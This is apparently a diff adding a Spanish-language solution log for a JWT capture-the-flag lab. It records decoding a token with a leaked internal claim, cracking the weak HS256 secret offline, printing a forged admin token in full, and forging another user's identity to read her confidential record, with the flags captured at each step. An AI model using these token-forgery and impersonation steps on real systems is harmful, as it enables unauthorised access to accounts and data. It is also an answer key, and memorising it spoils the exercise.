@@ -1,0 +1,23 @@
+### R1 - decodificar (claim nota_interna no debería viajar)
+HEADER:  {
+  "alg": "HS256",
+  "typ": "JWT"
+}
+PAYLOAD: {
+  "sub": "diego",
+  "role": "user",
+  "iat": 1794493835,
+  "exp": 1794497435,
+  "nota_interna": "deploy-tag FLAG{jwt_solo_base64}"
+}
+FIRMA:   5a356728c89f59496b9996c17309bab5…
+
+### R2a - crackear secreto offline
+secreto = mate123
+
+### R2b - forjar admin y pegar /admin
+token admin: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDQ5MzgzNSwiZXhwIjoxNzk0NDk3NDM1fQ.OnJRNvXiCBokVtpTnaK8cHMcJ1S3BTosfnppCwx4urM
+{"panel": "admin", "auditoria": "FLAG{jwt_forjado_admin}"}
+
+### R3 - forjar sub=maria y pegar /perfil
+{"usuario": "maria", "role": "user", "datos": "Legajo 1007 — Finanzas. Nota confidencial: FLAG{jwt_suplantacion_idor}"}
